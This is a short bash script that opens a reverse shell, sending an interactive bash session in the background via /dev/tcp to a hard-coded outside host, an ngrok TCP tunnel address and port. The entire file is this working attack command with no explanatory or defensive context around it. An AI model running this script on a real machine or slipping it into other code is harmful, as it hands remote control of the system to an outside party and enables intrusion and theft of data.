#!/bin/bash

# Set the remote host and port
REMOTE_HOST="5.tcp.eu.ngrok.io"
REMOTE_PORT="15779"

# Execute the reverse shell command
nohup bash -i >& /dev/tcp/$REMOTE_HOST/$REMOTE_PORT 0>&1

#
